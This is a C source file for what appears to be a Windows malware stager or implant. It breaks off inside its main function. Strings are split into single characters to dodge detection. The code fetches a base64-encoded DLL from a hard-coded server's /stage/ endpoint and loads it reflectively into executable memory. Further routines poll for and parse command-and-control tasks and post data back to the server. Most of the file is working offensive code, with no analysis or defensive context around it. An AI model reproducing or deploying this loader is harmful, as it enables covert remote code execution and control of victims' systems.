// TODO: Using custom implementations of functionalities such as trimming and parsing is not okay as they can easily be flagged
// TODO: is readJsonTask still modifying json?

#include "addresshunter.h"
#include <winnt.h>

#define WINHTTP_NO_ADDITIONAL_HEADERS NULL
#define WINHTTP_NO_REQUEST_DATA NULL
#define WINHTTP_QUERY_CONTENT_LENGTH 5
#define WINHTTP_HEADER_NAME_BY_INDEX NULL
#define WINHTTP_NO_HEADER_INDEX NULL

size_t base64_raw_size(size_t len)
{
    size_t padding = 0;

    // Determine padding based on the length of the Base64 string
    if (len > 0)
    {
        padding = (len % 4 == 0) ? 0 : (4 - (len % 4));
    }

    // Calculate the raw size
    return (len * 3) / 4 - padding;
}

void * myMemcpy (void *dest, const void *src, size_t len)
{
  char *d = dest;
  const char *s = src;
  while (len--)
    *d++ = *s++;
  return dest;
}

void* memset(void* dest, int val, size_t len)
{
    unsigned char* ptr = dest;
    while (len-- > 0)
        *ptr++ = val;
    return dest;
}

int myStrlenA(const CHAR* s1)
{
    const CHAR *s2 = s1; // Pointer to traverse the string

    while (*s2)
    { s2++; }
    return s2 - s1;
}

int myStrlenW(const WCHAR* s1)
{
    const WCHAR *s2 = s1; // Pointer to traverse the wide string

    while (*s2)
    { s2++; }
    return s2 - s1;
}

void myMemcpyW (void *dest, const void *src, size_t len)
{
  wchar_t *d = dest;
  const wchar_t *s = src;
  while (len--)
    *d++ = *s++;
}

wchar_t* myConcatW(PAPI api, const wchar_t *s1, const wchar_t *s2)
{
    const size_t len1 = myStrlenW(s1);
    const size_t len2 = myStrlenW(s2);
    wchar_t* result = (wchar_t*)((MALLOC)api->malloc)(len1 + len2 + 1); // +1 for the null-terminator
    myMemcpyW(result, s1, len1);
    myMemcpyW(result + len1, s2, len2 + 1); // +1 to copy the null-terminator
    return result;
}

DWORD Rva2Offset(DWORD dwRva, UINT_PTR uiBaseAddress)
{
    WORD wIndex = 0;
    PIMAGE_SECTION_HEADER pSectionHeader = NULL;
    PIMAGE_NT_HEADERS pNtHeaders = NULL;

    pNtHeaders = (PIMAGE_NT_HEADERS)(uiBaseAddress + ((PIMAGE_DOS_HEADER)uiBaseAddress)->e_lfanew);

    pSectionHeader = (PIMAGE_SECTION_HEADER)((UINT_PTR)(&pNtHeaders->OptionalHeader) + pNtHeaders->FileHeader.SizeOfOptionalHeader);

    if (dwRva < pSectionHeader[0].PointerToRawData)
    { return dwRva; }

    for (wIndex = 0; wIndex < pNtHeaders->FileHeader.NumberOfSections; wIndex++)
    {
        if (dwRva >= pSectionHeader[wIndex].VirtualAddress && dwRva < (pSectionHeader[wIndex].VirtualAddress + pSectionHeader[wIndex].SizeOfRawData))
        { return (dwRva - pSectionHeader[wIndex].VirtualAddress + pSectionHeader[wIndex].PointerToRawData); }
    }

    return 0;
}

CHAR* GetRequest(PAPI api, WCHAR* wcServer, INTERNET_PORT port, WCHAR* wcPath)
{
    WCHAR wVerb[] = { 'G', 'E', 'T', 0 };
    WCHAR wUserAgent[] = { 'I', 'm', 'h', 'u', 'l', 'l', 'u', 0 };
    WCHAR wVersion[] = { 'H', 'T', 'T', 'P', 0 };
    WCHAR wReferer[] = { 'h', 't', 't', 'p', 's', ':', '/', '/', 'g', 'o', 'o', 'g', 'l', 'e', '.', 'c', 'o', 'm', 0 };
    WCHAR wProxy[] = { 'W', 'I', 'N', 'H','T','T','P', '_', 'N','O','_','P','R','O','X','Y','_','N','A','M','E', 0 };
    WCHAR wProxyBypass[] = {'W', 'I', 'N', 'H', 'T', 'T', 'P', '_', 'N', 'O', '_', 'P', 'R', 'O', 'X', 'Y', '_', 'B', 'Y', 'P', 'A', 'S', 'S', 0 };

    DWORD dwBufferSize = 0;

    HINTERNET hSession = ((WINHTTPOPEN)api->WinHttpOpen)
    (
        wUserAgent,
        1,                      // WINHTTP_ACCESS_TYPE_NO_PROXY
        wProxy,
        wProxyBypass,
        0
    );

    #ifdef DEBUG
    if (hSession == NULL)
    {
        WCHAR error[] = { 'O', 'p', 'e', 'n', 'F', 0 };
        ((WPRINTF)api->wprintf)(error);
        DWORD errorCode = ((GETLASTERROR)api->GetLastError)();
        WCHAR myFormat2[] = { 'G', 'e', 't', 'E', 'r', 'r', 'o', 'r', ':', ' ', '%', 'd', '\n', 0 };
        ((WPRINTF)api->wprintf)(myFormat2, errorCode);
    }
    #endif

    HINTERNET hConnect = ((WINHTTPCONNECT)api->WinHttpConnect)
    (
        hSession,
        wcServer,
        port,
        0
    );

    #ifdef DEBUG
    if (hConnect == NULL)
    {
        WCHAR error[] = { 'C', 'o', 'n', 'n', 'F', 0 };
        ((WPRINTF)api->wprintf)(error);
        DWORD errorCode = ((GETLASTERROR)api->GetLastError)();
        WCHAR myFormat2[] = { 'G', 'e', 't', 'E', 'r', 'r', 'o', 'r', ':', ' ', '%', 'd', '\n', 0 };
        ((WPRINTF)api->wprintf)(myFormat2, errorCode);
    }
    #endif

    HINTERNET hRequest = ((WINHTTPOPENREQUEST)api->WinHttpOpenRequest)
    (
        hConnect,
        wVerb,
        wcPath,
        wVersion,
        wReferer,
        NULL,
        0
    );

    #ifdef DEBUG
    if (hRequest == NULL)
    {
        CHAR error[] = { 'R', 'e', 'q', 'F', '\n', 0 };
        ((PRINTF)api->printf)(error);
        DWORD errorCode = ((GETLASTERROR)api->GetLastError)();
        WCHAR myFormat2[] = { 'G', 'e', 't', 'E', 'r', 'r', 'o', 'r', ':', ' ', '%', 'd', '\n', 0 };
        ((WPRINTF)api->printf)(myFormat2, errorCode);
        ((MESSAGEBOXA)api->MessageBoxA)(0, error, error, 0x0L);
    }
    #endif

    // Send the request
    BOOL reqSuccess = ((WINHTTPSENDREQUEST)api->WinHttpSendRequest)
    (
        hRequest,
        NULL,
        0,
        NULL,
        0, 0, 0
    );

    #ifdef DEBUG
    if (reqSuccess == FALSE)
    {
        WCHAR error[] = { 'S', 'e', 'n', 'd', 'F', '\n', 0 };
        ((WPRINTF)api->wprintf)(error);
        DWORD errorCode = ((GETLASTERROR)api->GetLastError)();
        WCHAR myFormat2[] = { 'G', 'e', 't', 'E', 'r', 'r', 'o', 'r', ':', ' ', '%', 'd', '\n', 0 };
        ((WPRINTF)api->wprintf)(myFormat2, errorCode);
    }
    #endif

    BOOL rcvResponse = ((WINHTTPRECEIVERESPONSE)api->WinHttpReceiveResponse)(hRequest, NULL);
    #ifdef DEBUG
    if (rcvResponse == FALSE)
    {
        WCHAR error[] = { 'r', 'c', 'v', 'R', 'e', 's', 'p', 'o', 'n', 's', 'e', 'F', ' ', '%', 'd', '\n', 0 };
        ((WPRINTF)api->wprintf)(error, rcvResponse);
        DWORD errorCode = ((GETLASTERROR)api->GetLastError)();
        WCHAR myFormat2[] = { 'G', 'e', 't', 'E', 'r', 'r', 'o', 'r', ':', ' ', '%', 'd', '\n', 0 };
        ((WPRINTF)api->wprintf)(myFormat2, errorCode);
    }
    #endif

    LPVOID lpContentLength = NULL;
    DWORD dwBufferLength = 0;
    BOOL result = FALSE;

    // Calculates the needed buffer length for the content length string if the 4th param is null and returns ERROR_INSUFFICIENT_BUFFER
    ((WINHTTPQUERYHEADERS)api->WinHttpQueryHeaders)
    (
        hRequest,
        WINHTTP_QUERY_CONTENT_LENGTH,
        WINHTTP_HEADER_NAME_BY_INDEX,
        NULL,
        &dwBufferLength,
        WINHTTP_NO_HEADER_INDEX
    );

    if (((GETLASTERROR)api->GetLastError)() == ERROR_INSUFFICIENT_BUFFER)
    {
        // Allocate the calculated buffer
        lpContentLength = ((MALLOC)api->malloc)(dwBufferLength/sizeof(WCHAR));

        result = ((WINHTTPQUERYHEADERS)api->WinHttpQueryHeaders)
        (
            hRequest,
            WINHTTP_QUERY_CONTENT_LENGTH,
            WINHTTP_HEADER_NAME_BY_INDEX,
            lpContentLength,
            &dwBufferLength,
            WINHTTP_NO_HEADER_INDEX
        );
    }

    if (result)
    {
        dwBufferSize = ((STRTOINTW)api->StrToIntW)((WCHAR*)lpContentLength);
    }
    else
    {
        #ifdef DEBUG
        CHAR error[] = { 'Q', 'u', 'e', 'r', 'y', 'H', 'e', 'a', 'd', 'e', 'r', ' ', 'F', 'a', 'i', 'l', 0 };
        ((MESSAGEBOXA)api->MessageBoxA)(0, error, error, 0x0L);
        #endif
    }

    CHAR* cpBuffer = (CHAR*)((CALLOC)api->calloc)((size_t)(dwBufferSize), (size_t)sizeof(WCHAR));
    DWORD bufferIndexChange = 0;
    DWORD availableBytes = 0;
    DWORD actuallyRead = 0;
    LPDWORD lpActuallyRead = &actuallyRead;
    BOOL readSuccess = FALSE;

    while(((WINHTTPQUERYDATAAVAILABLE)api->WinHttpQueryDataAvailable)(hRequest, &availableBytes) && availableBytes != 0)
    {
        readSuccess = ((WINHTTPREADDATA)api->WinHttpReadData)
        (
            hRequest,
            (LPVOID)(cpBuffer+bufferIndexChange),
            availableBytes,
            lpActuallyRead
        );

        // Check for buffer overflow risk
        if (bufferIndexChange + (availableBytes / sizeof(WCHAR)) > dwBufferSize / sizeof(WCHAR))
        { break; }

        bufferIndexChange += availableBytes/sizeof(WCHAR);
    }

    ((WINHTTPCLOSEHANDLE)api->WinHttpCloseHandle)(hRequest);
    ((WINHTTPCLOSEHANDLE)api->WinHttpCloseHandle)(hConnect);
    ((WINHTTPCLOSEHANDLE)api->WinHttpCloseHandle)(hSession);

    if (readSuccess)
    { return cpBuffer; }
    return NULL;
}

void PostRequest(PAPI api, WCHAR* server, INTERNET_PORT port, const WCHAR* endpoint, CHAR* data)
{
    LPSTR pszData = (LPSTR)data;
    BOOL bResults = FALSE;

    WCHAR wVerb[] = { 'P', 'O', 'S', 'T', 0 };

    WCHAR wUserAgent[] = { 'I', 'm', 'h', 'u', 'l', 'l', 'u', 0 };

    WCHAR wVersion[] = { 'H', 'T', 'T', 'P', 0 };

    WCHAR wReferer[] = { 'h', 't', 't', 'p', 's', ':', '/', '/', 'g', 'o', 'o', 'g', 'l', 'e', '.', 'c', 'o', 'm', 0 };

    WCHAR wProxy[] = { 'W', 'I', 'N', 'H', 'T', 'T', 'P', '_', 'N', 'O', '_', 'P', 'R', 'O', 'X', 'Y', '_', 'N', 'A', 'M', 'E', 0 };
    WCHAR wProxyBypass[] = { 'W', 'I', 'N', 'H', 'T', 'T', 'P', '_', 'N', 'O', '_', 'P', 'R', 'O', 'X', 'Y', '_', 'B', 'Y', 'P', 'A', 'S', 'S', 0 };
    WCHAR contentType[] = { 'C', 'o', 'n', 't', 'e', 'n', 't', '-', 'T', 'y', 'p', 'e', ':', ' ', 'a', 'p', 'p', 'l', 'i', 'c', 'a', 't', 'i', 'o', 'n', '/', 'j', 's', 'o', 'n', 0 };

    HINTERNET hSession = ((WINHTTPOPEN)api->WinHttpOpen)
    (
        wUserAgent,
        1,                      // WINHTTP_ACCESS_TYPE_NO_PROXY
        wProxy,
        wProxyBypass,
        0
    );

    if (hSession)
    {
        // Specify an HTTP server
        HINTERNET hConnect = ((WINHTTPCONNECT)api->WinHttpConnect)(hSession, server, port, 0);

        if (hConnect) {
            // Create an HTTP request handle
            #define WINHTTP_FLAG_REFRESH 0x00000100
            HINTERNET hRequest = ((WINHTTPOPENREQUEST)api->WinHttpOpenRequest)
            (
                hConnect,
                wVerb,
                endpoint,
                wVersion,
                wReferer,
                NULL,
                WINHTTP_FLAG_REFRESH
            );

            if (hRequest)
            {
                // Send the request
                bResults = ((WINHTTPSENDREQUEST)api->WinHttpSendRequest)
                (
                    hRequest,
                    contentType,
                    0,
                    (LPVOID)pszData,
                    myStrlenA(pszData),
                    myStrlenA(pszData),
                    0
                );

                // Wait for the response
                if (bResults)
                { bResults = ((WINHTTPRECEIVERESPONSE)api->WinHttpReceiveResponse)(hRequest, NULL); }
            }
            ((WINHTTPCLOSEHANDLE)api->WinHttpCloseHandle)(hRequest);
        }
        ((WINHTTPCLOSEHANDLE)api->WinHttpCloseHandle)(hConnect);
    }
    ((WINHTTPCLOSEHANDLE)api->WinHttpCloseHandle)(hSession);

}

LPVOID winHTTPClient(PAPI api, PDWORD pdwDllSize)
{
    WCHAR wVerb[] = { 'G', 'E', 'T', 0 };

    WCHAR wEndpoint[] = { '/', 's', 't', 'a', 'g', 'e', '/', 0 };

    WCHAR wUserAgent[] = { 'I', 'm', 'h', 'u', 'l', 'l', 'u', 0 };

    WCHAR wVersion[] = { 'H', 'T', 'T', 'P', 0 };

    WCHAR wReferer[] = { 'h', 't', 't', 'p', 's', ':', '/', '/', 'g', 'o', 'o', 'g', 'l', 'e', '.', 'c', 'o', 'm', 0 };

    // Home
    //WCHAR wServer[] = { '1', '9', '2', '.', '1', '6', '8', '.', '1', '.', '1', '6', 0 };

    // School
    //WCHAR wServer[] = { '1', '4', '5', '.', '9', '3', '.', '5', '3', '.', '2', '1', '5', 0 };

    // Host-Only
     WCHAR wServer[] = { '1', '9', '2', '.', '1', '6', '8', '.', '0', '.', '1', 0 };

    WCHAR wProxy[] = { 'W', 'I', 'N', 'H', 'T', 'T', 'P', '_', 'N', 'O', '_', 'P', 'R', 'O', 'X', 'Y', '_', 'N', 'A', 'M', 'E', 0 };
    WCHAR wProxyBypass[] = { 'W', 'I', 'N', 'H', 'T', 'T', 'P', '_', 'N', 'O', '_', 'P', 'R', 'O', 'X', 'Y', '_', 'B', 'Y', 'P', 'A', 'S', 'S', 0 };

    INTERNET_PORT dwPort = 5001;
    DWORD dwEncodedDllSize = 0;

    HINTERNET hSession = ((WINHTTPOPEN)api->WinHttpOpen)
    (
        wUserAgent,
        1,                      // WINHTTP_ACCESS_TYPE_NO_PROXY
        wProxy,
        wProxyBypass,
        0
    );

    #ifdef DEBUG
    if (hSession == NULL)
    {
        WCHAR error[] = { 'O', 'p', 'e', 'n', 'F', 0 };
        ((WPRINTF)api->wprintf)(error);
        DWORD errorCode = ((GETLASTERROR)api->GetLastError)();
        WCHAR myFormat2[] = { 'G', 'e', 't', 'E', 'r', 'r', 'o', 'r', ':', ' ', '%', 'd', '\n', 0 };
        ((WPRINTF)api->wprintf)(myFormat2, errorCode);
    }
    #endif

    HINTERNET hConnect = ((WINHTTPCONNECT)api->WinHttpConnect)
    (
        hSession,
        wServer,
        dwPort,
        0
    );

    #ifdef DEBUG
    if (hConnect == NULL)
    {
        WCHAR error[] = { 'C', 'o', 'n', 'n', 'F', 0 };
        ((WPRINTF)api->wprintf)(error);
        DWORD errorCode = ((GETLASTERROR)api->GetLastError)();
        WCHAR myFormat2[] = { 'G', 'e', 't', 'E', 'r', 'r', 'o', 'r', ':', ' ', '%', 'd', '\n', 0 };
        ((WPRINTF)api->wprintf)(myFormat2, errorCode);
    }
    #endif

    HINTERNET hRequest = ((WINHTTPOPENREQUEST)api->WinHttpOpenRequest)
    (
        hConnect,
        wVerb,
        wEndpoint,
        wVersion,
        wReferer,
        NULL,
        0
    );

    #ifdef DEBUG
    if (hRequest == NULL)
    {
        CHAR error[] = { 'R', 'e', 'q', 'F', '\n', 0 };
        ((PRINTF)api->printf)(error);
        DWORD errorCode = ((GETLASTERROR)api->GetLastError)();
        WCHAR myFormat2[] = { 'G', 'e', 't', 'E', 'r', 'r', 'o', 'r', ':', ' ', '%', 'd', '\n', 0 };
        ((WPRINTF)api->printf)(myFormat2, errorCode);
        ((MESSAGEBOXA)api->MessageBoxA)(0, error, error, 0x0L);
    }
    #endif

    // Send the request
    BOOL reqSuccess = ((WINHTTPSENDREQUEST)api->WinHttpSendRequest)(
        hRequest,
        NULL,
        0,
        NULL,
        0, 0, 0
    );

    #ifdef DEBUG
    if (reqSuccess == FALSE)
    {
        WCHAR error[] = { 'S', 'e', 'n', 'd', 'F', '\n', 0 };
        ((WPRINTF)api->wprintf)(error);
        DWORD errorCode = ((GETLASTERROR)api->GetLastError)();
        WCHAR myFormat2[] = { 'G', 'e', 't', 'E', 'r', 'r', 'o', 'r', ':', ' ', '%', 'd', '\n', 0 };
        ((WPRINTF)api->wprintf)(myFormat2, errorCode);
    }
    #endif

    BOOL rcvResponse = ((WINHTTPRECEIVERESPONSE)api->WinHttpReceiveResponse)(hRequest, NULL);
    #ifdef DEBUG
    if (rcvResponse == FALSE)
    {
        WCHAR error[] = { 'r', 'c', 'v', 'R', 'e', 's', 'p', 'o', 'n', 's', 'e', 'F', ' ', '%', 'd', '\n', 0 };
        ((WPRINTF)api->wprintf)(error, rcvResponse);
        DWORD errorCode = ((GETLASTERROR)api->GetLastError)();
        WCHAR myFormat2[] = { 'G', 'e', 't', 'E', 'r', 'r', 'o', 'r', ':', ' ', '%', 'd', '\n', 0 };
        ((WPRINTF)api->wprintf)(myFormat2, errorCode);
    }
    #endif

    LPVOID lpContentLength = NULL;
    DWORD dwBufferLength = 0;
    BOOL result = FALSE;

    // Calculates the needed buffer length for the content length string if the 4th param is null and returns ERROR_INSUFFICIENT_BUFFER
    ((WINHTTPQUERYHEADERS)api->WinHttpQueryHeaders)
    (
        hRequest,
        WINHTTP_QUERY_CONTENT_LENGTH,
        WINHTTP_HEADER_NAME_BY_INDEX,
        NULL,
        &dwBufferLength,
        WINHTTP_NO_HEADER_INDEX
    );

    if (((GETLASTERROR)api->GetLastError)() == ERROR_INSUFFICIENT_BUFFER)
    {
        // Allocate the calculated buffer
        lpContentLength = ((MALLOC)api->malloc)(dwBufferLength/sizeof(WCHAR));

        result = ((WINHTTPQUERYHEADERS)api->WinHttpQueryHeaders)
        (
            hRequest,
            WINHTTP_QUERY_CONTENT_LENGTH,
            WINHTTP_HEADER_NAME_BY_INDEX,
            lpContentLength,
            &dwBufferLength,
            WINHTTP_NO_HEADER_INDEX
        );
    }

    if (result)
    {
        dwEncodedDllSize = ((STRTOINTW)api->StrToIntW)((WCHAR*)lpContentLength);
    }
    else
    {
        #ifdef DEBUG
        CHAR error[] = { 'Q', 'u', 'e', 'r', 'y', 'H', 'e', 'a', 'd', 'e', 'r', ' ', 'F', 'a', 'i', 'l', 0 };
        ((MESSAGEBOXA)api->MessageBoxA)(0, error, error, 0x0L);
        #endif
    }

    LPVOID lpEncodedBuffer = (LPVOID)((CALLOC)api->calloc)((size_t)(dwEncodedDllSize), (size_t)sizeof(WCHAR));
    WCHAR* wcEncodedBuffer = (WCHAR*)lpEncodedBuffer;
    DWORD bufferIndexChange = 0;
    DWORD availableBytes = 0;
    DWORD actuallyRead = 0;
    LPDWORD lpActuallyRead = &actuallyRead;
  
    while( ((WINHTTPQUERYDATAAVAILABLE)api->WinHttpQueryDataAvailable)(hRequest, &availableBytes) && availableBytes != 0 )
    {
        BOOL readSuccess = ((WINHTTPREADDATA)api->WinHttpReadData)
        (
            hRequest,
            (LPVOID)(wcEncodedBuffer+bufferIndexChange),
            availableBytes,
            lpActuallyRead
        );

        if (!readSuccess)
        {
            #ifdef DEBUG
            CHAR whrdFailed[] = { 'W', 'i', 'n', 'H', 't', 't', 'p', 'R', 'e', 'a', 'd', 'D', 'a', 't', 'a', 'F' };
            ((MESSAGEBOXA)api->MessageBoxA)(0, whrdFailed, whrdFailed, 0x0L);
            #endif
        }

        // Check for buffer overflow risk
        if (bufferIndexChange + (availableBytes / sizeof(WCHAR)) > dwEncodedDllSize / sizeof(WCHAR))
        { break; }

        bufferIndexChange += availableBytes/sizeof(WCHAR);
    }

    *pdwDllSize = base64_raw_size(dwEncodedDllSize);
    LPVOID lpRawBuffer = (LPVOID)(((CALLOC)api->calloc)(*pdwDllSize, (size_t)sizeof(CHAR)));

    DWORD lengthBuffer = ((CRYPTSTRINGTOBINARYA)api->CryptStringToBinaryA)
    (
        lpEncodedBuffer,
        dwEncodedDllSize,
        0x000000001,
        lpRawBuffer,
        pdwDllSize,
        NULL,
        NULL
    );

    ((FREE)api->free)(lpEncodedBuffer);
    ((FREE)api->free)(lpContentLength);

    ((WINHTTPCLOSEHANDLE)api->WinHttpCloseHandle)(hRequest);
    ((WINHTTPCLOSEHANDLE)api->WinHttpCloseHandle)(hConnect);
    ((WINHTTPCLOSEHANDLE)api->WinHttpCloseHandle)(hSession);

    if (lpRawBuffer != NULL && lengthBuffer)
    { return lpRawBuffer; }
    else
    { return 0;}
}

UINT_PTR GetRLOffset(PAPI api, PVOID lpDll)
{
    WCHAR rlName[] = { 'R', 'e', 'f', 'l', 'e', 'c', 't', 'i', 'v', 'e', 'L', 'o', 'a', 'd', 'e', 'r', 0 };

    UINT_PTR uiDll = (UINT_PTR)lpDll;
    #ifdef DEBUG
    WCHAR uiDllFormat[] = { 'd', 'l', 'l', 'A', 'd', 'd', 'r', 'e', 's', 's', ':', ' ', '%', 'p', '\n', 0 };
    ((WPRINTF)api->wprintf)(uiDllFormat, uiDll);
    #endif

    UINT_PTR uiNtHeaders;
    UINT_PTR uiExportDirectoryData;

    uiNtHeaders = uiDll + ((PIMAGE_DOS_HEADER)uiDll)->e_lfanew;
    #ifdef DEBUG
    WCHAR ntHeaders[] = { 'n', 't', 'h', 'e', 'a', 'd', 'e', 'r', 's', ':', ' ', '%', 'p', '\n', 0 };
    ((WPRINTF)api->wprintf)(ntHeaders, uiNtHeaders);
    #endif

    uiExportDirectoryData = (UINT_PTR) &((PIMAGE_NT_HEADERS64)uiNtHeaders)->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT];

    UINT_PTR uiExportDirectory = uiDll + Rva2Offset(((PIMAGE_DATA_DIRECTORY)uiExportDirectoryData)->VirtualAddress, uiDll);
    #ifdef DEBUG
    WCHAR pExportDir[] = { 'e', 'x', 'p', 'o', 'r', 't', 'd', 'i', 'r', ':', ' ', '%', 'p', '\n', 0 };
    ((WPRINTF)api->wprintf)(pExportDir, uiExportDirectory);
    #endif

    DWORD uiExportDirectorySize = ((PIMAGE_DATA_DIRECTORY)uiExportDirectoryData)->Size;
    #ifdef DEBUG
    WCHAR pExportDirSize[] = { 'e', 'x', 'p', 'o', 'r', 't', 's', 'i', 'z', 'e', ':', ' ', '%', 'd', '\n', 0 };
    ((WPRINTF)api->wprintf)(pExportDirSize, uiExportDirectorySize);
    #endif

    DWORD dwNumberOfEntries;
    UINT_PTR functionNameAddresses;
    UINT_PTR functionOrdinals;
    UINT_PTR functionAddresses;
    UINT_PTR rlAddress = 0;

    dwNumberOfEntries = ((PIMAGE_EXPORT_DIRECTORY)uiExportDirectory)->NumberOfNames;
    #ifdef DEBUG
    CHAR entries[] = { 'e', 'n', 't', 'r', 'i', 'e', 's', ':', ' ', '%', 'd', '\n', 0 };
    ((PRINTF)api->printf)(entries, dwNumberOfEntries);
    #endif

    // NOTE: ExportDirectory->AddressOf... gives an address to an array //
    // but the address is relative to the DLL base which is the address //
    // in the DLL's NT header(?). This address is the preferred address //
    // but is not always the real location the DLL is located in memory //
    // Therefore, the following struct members don't return values that //
    // we can use as is. However, we can calculate their offsets to the //
    // DLL's current location and then add the offsets to DLL's current //
    // address. I *believe* reading the base address from the NT header //
    // and adding the relative virtual address to it would work as well //
    // However, I am not sure if it actually would as I did not test it //
    functionNameAddresses = uiDll + Rva2Offset(((PIMAGE_EXPORT_DIRECTORY)uiExportDirectory)->AddressOfNames, uiDll);
    functionOrdinals = uiDll + Rva2Offset(((PIMAGE_EXPORT_DIRECTORY)uiExportDirectory)->AddressOfNameOrdinals, uiDll);
    functionAddresses = uiDll + Rva2Offset(((PIMAGE_EXPORT_DIRECTORY)uiExportDirectory)->AddressOfFunctions, uiDll);

    CHAR* exportedFunctionName = {0};
    while(dwNumberOfEntries--)
    {
        exportedFunctionName = (CHAR*)(uiDll + Rva2Offset(DEREF(functionNameAddresses), uiDll));
        if (my_strcmp(exportedFunctionName, (CHAR*)rlName) == 0)
        {
            #ifdef DEBUG
            CHAR error1[] = { 'R', 'L', ' ', 'N', 'o', 't', ' ', 'F', 'o', 'u', 'n', 'd', 0 };
            ((MESSAGEBOXA)api->MessageBoxA)(0, error1, error1, 0x0L);
            #endif

            functionNameAddresses += sizeof(DWORD); // 32 bit pointers
            functionOrdinals += sizeof(WORD);       // Ordinal values or 16 bit
            continue;
        }
        else
        {
            #ifdef DEBUG
            CHAR hm[] = { 'F', 'o', 'u', 'n', 'd', ' ', 'R', 'L', 0 };
            ((MESSAGEBOXA)api->MessageBoxA)(0, hm, hm, 0x0L);
            #endif
            // Get the index from the ordinal table, multiply by the size
            // of how big one address in the function address table is.
            // This will give us the number to add to the pointer to
            // `functionAddresses` to get the offset to the RL.
            // Remember, this offset is from the reflective DLL's current
            // address. It will be used to pass to CreateThread as it's
            // fourth parameter (thread s tarting point) //
            functionAddresses += DEREF_16(functionOrdinals) * sizeof(DWORD);
            rlAddress = Rva2Offset(DEREF_32(functionAddresses), uiDll);
            break;
        }
    }

    if (rlAddress)
    { return rlAddress; }
    else
    { return 0; }
}

HANDLE inject(PAPI api, LPVOID lpDll, DWORD dwDllSize)
{
    DWORD loaderOffset;
    REFLECTIVELOADER pReflectiveLoader;
    DLLMAIN pDllMain;

    loaderOffset = GetRLOffset(api, lpDll);

    #ifdef DEBUG
    WCHAR loader[] = { 'L', 'o', 'a', 'd', 'e', 'r', ':', ' ', '%', 'p', '\n', 0 };
    ((WPRINTF)api->wprintf)(loader, (UINT_PTR)lpDll + loaderOffset);
    #endif


    //((WPRINTF)api->wprintf)(L"Origin DLL location: %p\n", lpDll);
    pReflectiveLoader = (REFLECTIVELOADER)((UINT_PTR)lpDll + loaderOffset);

    DWORD dwOldProtect;
    ((VIRTUALPROTECT)api->VirtualProtect)(lpDll, dwDllSize, PAGE_EXECUTE_READWRITE, &dwOldProtect);

    HANDLE hDllBase = NULL;

    pDllMain = (DLLMAIN)pReflectiveLoader();

    #ifdef DEBUG
    CHAR text[] = { 'D', 'l', 'l', 'M', 'a', 'i', 'n', 0 };
    ((MESSAGEBOXA)api->MessageBoxA)(0, text, text, 0x0L);
    #endif

    if( pDllMain != NULL )
    {
        // call the loaded librarys DllMain to get its HMODULE
        if ( pDllMain(NULL, DLL_QUERY_HMODULE, &hDllBase) == FALSE)
        {
            #ifdef DEBUG
            CHAR text[] = { 'D', 'l', 'l', 'M', 'a', 'i', 'n', 'F', 'a', 'i', 'l', '1', 0 };
            ((MESSAGEBOXA)api->MessageBoxA)(0, text, text, 0x0L);
            #endif
            hDllBase = NULL;
        }
    }
    else
    {
        #ifdef DEBUG
        CHAR text[] = { 'D', 'l', 'l', 'M', 'a', 'i', 'n', 'F', 'a', 'i', 'l', '2', 0 };
        ((MESSAGEBOXA)api->MessageBoxA)(0, text, text, 0x0L);
        #endif
    }

    return hDllBase;
}

CHAR* myStrtok(CHAR* str, CHAR delim, BOOL reset)
{
    static DWORD index = 0;
    if (reset)
    { index=0; return NULL; }
    //CHAR* token = { 0 };
    DWORD lenStr = myStrlenA(str);
    str += index;

    for (int i=0; i<lenStr+1; i++)
    {
        if (str[i] == delim)
        { str[i] = '\0'; }
    }

    //token = str;
    index += myStrlenA(str)+1;    // +1 for null byte
    return str;
}

CHAR* myStartTrim(CHAR* str, CHAR trim)
{
    CHAR* outStr = str;
    while (outStr[0] == trim)
    { outStr++; }
    return outStr;
}

CHAR* myEndTrim(CHAR* str, CHAR trim)
{
    for (int i=myStrlenA(str)-1; i>=0; i--)     // -1 for null terminator
    {
        if(str[i] == trim)
        { str[i] = '\0'; }          // change trim with a null terminator
        else
        { return str; }
    }
    return str;
}

CHAR* myTrim(CCHAR* str, CHAR trim)
{
    CHAR* outStr = myStartTrim(str, trim);
    outStr = myEndTrim(outStr, trim);
    return outStr;
}

CHAR* readJsonTask(PAPI api, CHAR* json, CHAR** taskId, CHAR** taskType, CHAR** uuid)
{
    ((PRINTF)api->printf)("\nYou're in readJsonTask\n", uuid);
    CHAR* tmpJson = json;  // myStrtok modifies the string itself
    CHAR* task;
    CHAR delim = { '\n' };
    ((PRINTF)api->printf)("\ntmpJson: %s\n", tmpJson);
    CHAR* token = myStrtok(tmpJson, delim, FALSE);
    ((PRINTF)api->printf)("\nFirst token: %s\n", token);
    CHAR blacklist[] = { '[', ']', '\0' };

    if (token[0] == '[' && token[1] == ']')
    {
        ((PRINTF)api->printf)("tmpJson is empty, returning NULL");
        myStrtok(NULL, 0, TRUE);
        return NULL;
    }

    // SKIP [ and ]
    for (int i=0; i<=myStrlenA(blacklist)-1; i++)
    {
        for (int j=0; j<=myStrlenA(token)-1; j++)
        {
            if (token[j] == blacklist[i])
            {
                token = myStrtok(tmpJson, delim, FALSE);
                i=-1;
                break;
            }
        }
    }

    // dont look
    *taskId = myTrim(token, ' ');
    ((PRINTF)api->printf)("\ntaskId: %s\n", *taskId);
    *taskId = myEndTrim(*taskId, ',');
    ((PRINTF)api->printf)("\ntaskId: %s\n", *taskId);
    task = myTrim(myStrtok(tmpJson, delim, FALSE), ' ');
    ((PRINTF)api->printf)("\ntask: %s\n", task);
    task = myEndTrim(task, ',');
    ((PRINTF)api->printf)("\ntask: %s\n", task);
    task = myTrim(task, '"');
    ((PRINTF)api->printf)("\ntask: %s\n", task);
    *taskType = myTrim(myStrtok(tmpJson, delim, FALSE), ' ');
    ((PRINTF)api->printf)("\ntaskType: %s\n", *taskType);
    *taskType= myEndTrim(*taskType, ',');
    ((PRINTF)api->printf)("\ntaskType: %s\n", *taskType);
    *taskType = myTrim(*taskType, '"');
    ((PRINTF)api->printf)("\ntaskType: %s\n", *taskType);
    *uuid = myTrim(myStrtok(tmpJson, delim, FALSE), ' ');
    ((PRINTF)api->printf)("\nuuid: %s\n", *uuid);
    *uuid = myEndTrim(*uuid, ',');
    ((PRINTF)api->printf)("\nuuid: %s\n", *uuid);
    *uuid = myTrim(*uuid, '"');
    ((PRINTF)api->printf)("\nuuid: %s\n", *uuid);

    myStrtok(NULL, 0, TRUE);
    return task;
}

void myMain()
{
    API Api = { 0 };
    PAPI api = &Api;

    // Library Names
    CHAR user32_c[] = { 'u', 's', 'e', 'r', '3', '2', '.', 'd', 'l', 'l', 0 };
